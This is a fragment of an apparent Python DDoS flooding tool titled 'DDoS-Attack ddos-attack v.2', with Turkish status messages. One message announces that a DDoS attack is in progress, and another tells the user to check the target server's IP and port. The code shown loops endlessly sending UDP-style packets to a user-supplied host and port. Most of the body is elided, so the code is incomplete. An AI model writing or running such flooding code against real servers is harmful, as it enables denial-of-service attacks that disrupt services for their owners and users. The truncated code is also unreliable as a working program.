	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--DDoS Saldırısı Yapılıyor--> \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	DDoS-Attack ddos-attack v.2
...
if __name__ == '__main__':
	...
	try:
		...
		print("\033[91mserver ip ve port'u kontrol edin\033[0m",e)
		print(e)
		usage()
	while True:
